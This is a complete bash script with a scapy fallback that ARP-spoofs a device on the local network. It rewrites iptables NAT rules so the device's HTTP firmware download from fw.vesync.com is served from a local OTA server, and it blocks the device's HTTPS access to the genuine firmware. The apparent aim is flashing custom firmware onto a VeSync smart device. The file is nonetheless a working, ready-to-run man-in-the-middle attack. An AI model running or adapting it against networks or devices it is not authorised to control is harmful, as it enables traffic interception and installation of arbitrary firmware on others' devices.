#!/usr/bin/env bash
#
# host_mitm.sh - redirect a device's HTTP download of "fw.vesync.com" to a local
# server, by ARP-spoofing the device so its traffic flows through this host, and
# NAT/DNAT-ing it. The device keeps internet connectivity (everything is
# forwarded), so the cloud can still command it to update.
#
# Run as ROOT on a Linux machine that is on the SAME L2 network as the device.
# Stop with Ctrl-C (runs host_mitm_stop.sh).
#
# Requirements:
#   - iptables (or nftables)
#   - python3 + scapy  (sudo pip install scapy)   OR   arpspoof (dsniff)
#
# Configure via environment (defaults shown):
#   IFACE=wlan0                 # interface on the device's network
#   GATEWAY=192.168.1.1         # the LAN gateway
#   DEVICE=192.168.1.50         # the target device IP   (auto-detect helps: see README)
#   DEVMAC=aa:bb:cc:dd:ee:ff    # target device MAC (resolved automatically if omitted)
#   SERVER=<this host IP>       # where the OTA server listens (auto if omitted)
#   PORT=18080                  # OTA server port
#   REDIRECT_443=1              # also block the device's HTTPS to fw.vesync.com so
#                               # it can't silently download the genuine firmware
#
set -euo pipefail

IFACE=${IFACE:-wlan0}
GATEWAY=${GATEWAY:?set GATEWAY e.g. 192.168.1.1}
DEVICE=${DEVICE:?set DEVICE (target device IP)}
SERVER=${SERVER:-$(ip -4 -o addr show "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -1)}
PORT=${PORT:-18080}
REDIRECT_443=${REDIRECT_443:-1}
SPOOF_TIMEOUT=${SPOOF_TIMEOUT:-60}   # seconds between forced re-spoofs (loop runs every 1s anyway)

echo "[*] iface=$IFACE gateway=$GATEWAY device=$DEVICE server=$SERVER port=$PORT"

# resolve device MAC if not given
if [ -z "${DEVMAC:-}" ]; then
  ping -c1 -W1 "$DEVICE" >/dev/null 2>&1 || true
  DEVMAC=$(ip neigh show "$DEVICE" | awk '{print $5}' | head -1)
fi
echo "[*] device MAC: ${DEVMAC:-<unknown>}"

echo "[*] enabling forwarding"
sysctl -w net.ipv4.ip_forward=1

echo "[*] adding NAT/DNAT rules"
# HTTP of the device -> local OTA server
iptables -t nat -C PREROUTING -s "$DEVICE" -p tcp --dport 80 -j DNAT --to-destination "$SERVER:$PORT" 2>/dev/null || \
iptables -t nat -A PREROUTING -s "$DEVICE" -p tcp --dport 80 -j DNAT --to-destination "$SERVER:$PORT"
# keep the rest of the device's traffic online
iptables -t nat -C POSTROUTING -s "$DEVICE" -j MASQUERADE 2>/dev/null || \
iptables -t nat -A POSTROUTING -s "$DEVICE" -j MASQUERADE
iptables -C FORWARD -s "$DEVICE" -j ACCEPT 2>/dev/null || iptables -A FORWARD -s "$DEVICE" -j ACCEPT
iptables -C FORWARD -d "$DEVICE" -j ACCEPT 2>/dev/null || iptables -A FORWARD -d "$DEVICE" -j ACCEPT

if [ "$REDIRECT_443" = "1" ]; then
  # make sure the device can NOT fetch the genuine firmware over HTTPS
  for ip in $(getent hosts fw.vesync.com | awk '{print $1}' | sort -u); do
    iptables -C FORWARD -s "$DEVICE" -p tcp -d "$ip" --dport 443 -j REJECT 2>/dev/null || \
    iptables -I FORWARD 1 -s "$DEVICE" -p tcp -d "$ip" --dport 443 -j REJECT --reject-with tcp-reset
    echo "    block $ip:443"
  done
fi

echo "[*] ARP spoofing (Ctrl-C to stop) ..."
trap 'echo; bash "$(dirname "$0")/host_mitm_stop.sh" 2>/dev/null; exit 0' INT TERM

if command -v arpspoof >/dev/null 2>&1; then
  # dsniff's arpspoof: tell DEVICE that GATEWAY is at our MAC (and vice-versa not needed w/ SNAT)
  arpspoof -i "$IFACE" -t "$DEVICE" "$GATEWAY"
else
  exec python3 - "$IFACE" "$DEVICE" "$DEVMAC" "$GATEWAY" <<'PY'
import sys, time
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip
iface, dev_ip, dev_mac, gw = sys.argv[1:5]
if not dev_mac or dev_mac in ("FAILED", "INCOMPLETE"):
    dev_mac = getmacbyip(dev_ip)
my = get_if_hwaddr(iface)
print(f"scapy: telling {dev_ip} ({dev_mac}) that {gw} is at {my}")
while True:
    pkt = Ether(src=my, dst=dev_mac) / ARP(op=2, hwsrc=my, psrc=gw, hwdst=dev_mac, pdst=dev_ip)
    sendp(pkt, iface=iface, verbose=False)
    time.sleep(1)
PY
fi
